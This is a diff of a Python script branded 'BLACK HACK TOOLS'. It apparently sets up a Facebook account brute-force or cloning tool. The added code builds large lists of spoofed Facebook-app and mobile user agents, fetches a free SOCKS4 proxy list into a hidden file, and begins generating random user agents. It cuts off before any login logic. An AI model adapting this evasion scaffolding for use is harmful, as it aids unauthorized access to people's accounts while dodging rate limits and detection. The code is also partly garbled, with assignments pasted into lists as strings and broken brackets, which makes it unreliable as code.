@@ -1,280 +1,351 @@
-from os import path
-import requests,random,uuid,string,hashlib,json
-from os import path
-import os,uuid,base64,requests,zlib,httpx,time,platform,datetime
-from time import localtime as lt
-from urllib.request import urlopen
-import os,base64,zlib,pip,urllib,urllib3
-import platform,math,smtplib
-import platform
-import smtplib
-import math
-
-
-import os,time,random,string,re
-import sys,requests,json,uuid,mechanize
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os,sys,time,json,random,re,string,platform,base64,uuid
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
 from datetime import datetime
-from string import *
+from time import sleep
+from time import sleep as waktu
+import requests
+#------------------[ USER-AGENT ]-------------------#
+os.system('espeak -a 300 " WELCOME TO BLACK HACK TOOLS FREE TOOL"')
+from time import localtime as lt
+#-----------------[ IMPORT-MODULE ]-------------------#
 
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+import os
+#------------------[ USER-AGENT ]-------------------#
+user_agent=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36 (KHTML like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]', 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36 (KHTML like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]', 'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36 (KHTML like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RQ2A.210305.006; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10; zh-cn; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi 8A Pro Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; Redmi 8A Pro Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPR/50.0.2254.149183', 'Mozilla/5.0 (Linux; U; Android 9; en-us; Redmi Note 8 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.7.27 swan-mibrowser', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36 (KHTML like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]', 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36 (KHTML like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]', 'Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36 (KHTML like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RQ2A.210305.006; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 10; zh-cn; Redmi Note 7 Build/QKQ1.190910.002) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; en-US; Redmi 8A Pro Build/PKQ1.190319.001) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.9.1226 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 9; Redmi 8A Pro Build/PKQ1.190319.001; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 OPR/50.0.2254.149183', 'Mozilla/5.0 (Linux; U; Android 9; en-us; Redmi Note 8 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.7.27 swan-mibrowser]', 'uas_bawaan = Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36 (KHTML like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'uas_nokiac2 = NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile', 'uas_nokiax20 = Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36 (KHTML seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36', 'uas_nokiax = Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36 (KHTML like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0gzip(gfe)', 'uas_samsungse = Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36 (KHTML like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36', 'uas_redmi9a = Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36', 'uas_nokiaxl = Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12', 'uas_chromelinux = Mozilla/5.0 (Linux; Android 4; OPPO A57 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML like Gecko) Chrome/97.0.4692.71 Safari/537.36', 'uas_j7prime = Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501', 'uas_tes = Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)', 'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36', 'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML like Gecko) Safari/420+', 'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36 (KHTML like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36])', 'uas_nokiac3 = NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML like Gecko) Safari/420+', 'uas_nokia5plus = Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36 (KHTML like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]', 'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36 (KHTML like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0gzip(gfe)', 'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36])', 'a = Mozilla/5.0 (Linux; Android', 'f = AppleWebKit/537.36 (KHTML like Gecko)', 'aa = Mozilla/5.0 (Linux; Android 12;', 'g = Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML like Gecko)', 'aa = Mozilla/5.0 (Linux; Android 12;', 'g = Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML like Gecko)', 'aa = Mozilla/5.0 (Linux; Android 13;', 'g = Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML like Gecko)', 'a = Mozilla/5.0 (Linux; Android 12;', 'g = Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML like Gecko)', 'aa = Mozilla/5.0 (Linux; Android 12;', 'g = AppleWebKit/537.36 (KHTML like Gecko)', 'aa = Mozilla/5.0 (Linux; Android 12;', 'g = AppleWebKit/537.36 (KHTML like Gecko)', 'aa = Mozilla/5.0 (Linux; Android 12;', 'g = AppleWebKit/537.36 (KHTML like Gecko)', 'aa = Mozilla/5.0 (iPhone;', 'g = AppleWebKit/605.1.15 (KHTML like Gecko)', 'aa = Mozilla/5.0 (Linux; Android 11;', 'g = AppleWebKit/537.36 (KHTML like Gecko)', 'aa = Mozilla/5.0 (Linux; Android 10;', 'g = AppleWebKit/537.36 (KHTML like Gecko)', 'user-agent: Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 })', 'user-agent: Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0 ', 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.99 Safari/537.36 }', 'user-agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.114 Safari/537.36 }', 'user-agent: NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML like Gecko) Safari/420+ }']
+header_grup_op = {'user-agent':'[FBAN/FB4A;FBAV/;FBBV/[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748125;FBDM({density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]'}
+head_sam = {'User Agent : Davik/2.1.0 (Linux; U; Android 4.0.0; Infinix X682B Build/Build/QP1A.190711.020; wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1'}
+head_sams = {"user-agent": "Davik/2.1.0 (Linux; U; Android 10; TECNO LC8 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/317.0.0.3.45;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/796703265;FBCR/Telenor;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO LC8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
+header_grup_asp = {"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-E225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]"}
+ua_zs = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/306.0.0.4.53;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/207672721;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
+useragent_xxx = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; Infinix X688B Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/325.0.0.4.67;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/683135857;FBCR/Telenor;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
+header_grup_gop = {"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"}
+head_f = {"user-agent": "Davik/2.1.0 (Linux; U; Android 10; TECNO LC8 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/317.0.0.3.45;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/796703265;FBCR/Telenor;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO LC8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
+ua_z = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; V2111 Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/316.0.0.2.130;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/733896687;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/V2111;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
+ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; M2101K7AG Build/SKQ1.210908.001) [FBAN/MessengerLite;FBAV/311.0.0.5.119;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/190069654;FBCR/;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2101K7AG;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]"}
+ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 10; RMX1821 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/324.0.0.6.49;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/994696613;FBCR/Jazz;FBMF/Realme;FBBD/Realme;FBDV/RMX1821;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
+ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/MessengerLite;FBAV/302.0.0.1.80;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/862362285;FBCR/AIRTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
+ua_x = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]"}
+uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 13; V2036 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]","Mozilla/5.0 (Linux; Android 5.1.1; vivo Y31L Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
+ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36",]
 
-ua = []
-ua.append('Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114')
-ua.append('Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102')
-ua.append('Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108')
-ua.append('Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111')
-ua.append('Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102')
-ua.append('Mozilla/5.0 (Linux; Android 8; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102')
-ua.append('Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104')
-ua.append('Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5669.73 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5326.82 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5479.49 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5903.48 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4777.63 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.3011.34 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4336.91 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5565.86 Mobile Safari/537.36')
-ua.append('Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36')
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+    open('.prox.txt','w').write(prox)
+except Exception as e:
+    pass
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Mozilla/5.0 (Symbian/3; Series60/'
+    b=random.randrange(1, 9)
+    c=random.randrange(1, 9)
+    d='Nokia'
+    e=random.randrange(100, 9999)
+    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+    g=random.randrange(1, 9)
+    h=random.randrange(1, 4)
+    i=random.randrange(1, 4)
+    j=random.randrange(1, 4)
+    k='Mobile Safari/535.1'
